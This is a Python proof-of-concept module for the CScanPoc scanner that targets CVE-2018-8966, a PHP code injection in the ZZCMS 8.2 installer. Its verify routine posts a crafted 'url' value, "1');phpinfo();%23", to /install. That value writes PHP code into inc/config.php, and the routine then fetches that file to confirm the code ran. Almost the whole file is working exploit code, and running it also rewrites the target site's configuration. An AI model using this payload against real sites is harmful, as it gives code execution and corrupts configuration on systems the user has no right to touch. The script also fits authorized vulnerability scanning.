# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ZZCMS_0003'  # 平台漏洞编号，留空
    name = 'ZZCMS siteurl 参数PHP代码注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2018-03-26'  # 漏洞公布时间
    desc = '''
        ZZCMS是一款集成app移动平台与电子商务平台的内容管理系统。
        ZZCMS 8.2版本中存在安全漏洞。攻击者可通过向install/index.php文件发送'siteurl'参数利用该漏洞注入PHP代码。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-07487'  # 漏洞来源
    cnvd_id = 'CNVD-2018-07487'  # cnvd漏洞编号
    cve_id = 'CVE-2018-8966'  # cve编号
    product = 'ZZCMS'  # 漏洞应用名称
    product_version = '8.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '68fd3d14-8541-4fcc-b151-4eede793c14e'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/install'
            data = "step=5&db_host=localhost&db_user=root&db_pass=****&db_name=zzcms&url=1');phpinfo();%23"
            url = self.target + payload
            requests.post(url, data=data)
            verify_url = self.target + '/inc/config.php'
            r = requests.get(verify_url)

            if r.status_code == 200 and 'PHP Version' in r.text and 'System' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
